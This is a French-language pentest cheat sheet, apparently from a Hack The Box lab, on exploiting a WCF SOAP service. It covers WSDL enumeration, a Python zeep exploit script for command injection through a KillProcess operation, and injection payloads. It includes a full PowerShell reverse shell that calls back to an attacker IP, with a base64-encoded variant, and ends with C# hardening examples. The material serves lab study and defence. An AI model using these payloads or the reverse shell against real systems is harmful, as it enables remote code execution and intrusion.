# WCF Service Exploitation

### <mark style="color:blue;">ğŸŒ WCF Service Exploitation</mark> <a href="#wcf-exploitation" id="wcf-exploitation"></a>

#### <mark style="color:green;">Qu'est-ce que WCF ?</mark>

**Windows Communication Foundation** est un framework Microsoft pour crÃ©er des services web orientÃ©s service (SOA).

#### Architecture WCF

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         SOAP/HTTP          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Client         â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚  WCF Service     â”‚
â”‚  (Python/C#)     â”‚   XML Messages (WSDL)      â”‚  (MonitorService)â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                             â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### <mark style="color:green;">Ã‰numÃ©ration</mark>

**1. RÃ©cupÃ©ration du WSDL**

```bash
# Via curl
curl http://overwatch.htb:8000/MonitorService?wsdl -o service.wsdl

# Ou single WSDL (tout en un fichier)
curl http://overwatch.htb:8000/MonitorService?singleWsdl -o service.wsdl
```

**2. Analyse du WSDL**

```bash
# Lister les opÃ©rations
grep -i "<wsdl:operation" service.wsdl

# Exemple de sortie :
# <wsdl:operation name="StartMonitoring">
# <wsdl:operation name="StopMonitoring">
# <wsdl:operation name="KillProcess">
```

**3. Structure WSDL**

```xml
<definitions>
  <types>
    <!-- DÃ©finitions des types de donnÃ©es -->
  </types>
  
  <message name="KillProcessRequest">
    <part name="processName" type="xsd:string"/>
  </message>
  
  <portType name="IMonitoringService">
    <operation name="KillProcess">
      <input message="tns:KillProcessRequest"/>
      <output message="tns:KillProcessResponse"/>
    </operation>
  </portType>
  
  <binding name="BasicHttpBinding_IMonitoringService" type="tns:IMonitoringService">
    <!-- Configuration SOAP -->
  </binding>
  
  <service name="MonitoringService">
    <port name="BasicHttpBinding_IMonitoringService" 
          binding="tns:BasicHttpBinding_IMonitoringService">
      <soap:address location="http://overwatch.htb:8000/MonitorService"/>
    </port>
  </service>
</definitions>
```

#### <mark style="color:green;">Exploitation avec Python (Zeep)</mark>

**Installation**

```bash
pip3 install zeep requests
```

**Script d'Ã‰numÃ©ration**

```python
#!/usr/bin/env python3
from zeep import Client
from zeep.transports import Transport
from requests import Session

# Configuration
session = Session()
session.verify = False
transport = Transport(session=session)

# Charger le WSDL
wsdl_url = 'http://127.0.0.1:8000/MonitorService?wsdl'
client = Client(wsdl_url, transport=transport)

# Lister les mÃ©thodes
print("[*] Available operations:")
for service in client.wsdl.services.values():
    for port in service.ports.values():
        for operation in port.binding._operations.values():
            print(f"  - {operation.name}")
            print(f"    Input: {operation.input.body}")
            print(f"    Output: {operation.output.body}")
```

**Script d'Exploitation**

```python
#!/usr/bin/env python3
from zeep import Client
from zeep.transports import Transport
from requests import Session
import sys

# Configuration avec Host header personnalisÃ©
class HostHeaderAdapter(requests.adapters.HTTPAdapter):
    def add_headers(self, request, **kwargs):
        request.headers['Host'] = 'overwatch.htb:8000'
        return request

session = Session()
session.mount('http://', HostHeaderAdapter())
transport = Transport(session=session)

# TÃ©lÃ©charger et modifier le WSDL
wsdl_response = session.get(
    'http://127.0.0.1:8000/MonitorService?wsdl',
    headers={'Host': 'overwatch.htb:8000'}
)

wsdl_content = wsdl_response.text.replace(
    'overwatch.htb:8000',
    '127.0.0.1:8000'
)

with open('/tmp/temp_wsdl.xml', 'w') as f:
    f.write(wsdl_content)

# CrÃ©er le client
client = Client('file:///tmp/temp_wsdl.xml', transport=transport)

# Exploit : Command Injection
if len(sys.argv) > 1:
    payload = sys.argv[1]
    print(f"[*] Sending payload: {payload}")
    result = client.service.KillProcess(payload)
    print(f"[+] Result: {result}")
else:
    print("Usage: python3 exploit.py <command>")
```

#### <mark style="color:green;">Exploitation Manuelle (cURL)</mark>

```bash
# RequÃªte SOAP pour KillProcess
curl -X POST http://127.0.0.1:8000/MonitorService \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>test; whoami; #</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>'
```

#### <mark style="color:green;">Payloads d'Exploitation</mark>

**1. Command Injection Basique**

```bash
python3 exploit.py "test; whoami; #"
python3 exploit.py "test; net user; #"
python3 exploit.py "test; ipconfig; #"
```

**2. Reverse Shell**

```bash
# Payload PowerShell
payload='test; $c=New-Object Net.Sockets.TCPClient("10.10.15.75",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$x=$sb+"PS "+(pwd).Path+"> ";$z=([text.encoding]::ASCII).GetBytes($x);$s.Write($z,0,$z.Length);$s.Flush()};$c.Close(); #'

python3 exploit.py "$payload"
```

**3. Encoded Command**

```bash
# CrÃ©er le payload
cat > shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.75',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF

# Encoder
PAYLOAD=$(cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0)

# Exploiter
python3 exploit.py "test; powershell -EncodedCommand $PAYLOAD; #"
```

#### <mark style="color:green;">SÃ©curisation des Services WCF</mark>

**1. Validation des EntrÃ©es**

```csharp
public string KillProcess(string processName)
{
    // Whitelist de caractÃ¨res autorisÃ©s
    if (!Regex.IsMatch(processName, @"^[a-zA-Z0-9_-]+$"))
    {
        throw new ArgumentException("Invalid process name");
    }
    
    // Utiliser les commandes PowerShell de maniÃ¨re sÃ©curisÃ©e
    var cmd = new Command("Stop-Process");
    cmd.Parameters.Add("Name", processName);
    cmd.Parameters.Add("Force");
    
    // ExÃ©cuter
    using var runspace = RunspaceFactory.CreateRunspace();
    runspace.Open();
    using var pipeline = runspace.CreatePipeline();
    pipeline.Commands.Add(cmd);
    var results = pipeline.Invoke();
    
    return "Process stopped";
}
```

**2. Authentification**

```csharp
[ServiceContract]
public interface IMonitoringService
{
    [OperationContract]
    string KillProcess(string processName, string apiKey);
}

public string KillProcess(string processName, string apiKey)
{
    if (apiKey != ConfigurationManager.AppSettings["ApiKey"])
    {
        throw new UnauthorizedAccessException();
    }
    // ...
}
```

**3. Configuration SÃ©curisÃ©e**

```xml
<system.serviceModel>
  <bindings>
    <wsHttpBinding>
      <binding name="SecureBinding">
        <security mode="Transport">
          <transport clientCredentialType="Certificate"/>
        </security>
      </binding>
    </wsHttpBinding>
  </bindings>
</system.serviceModel>
```

***
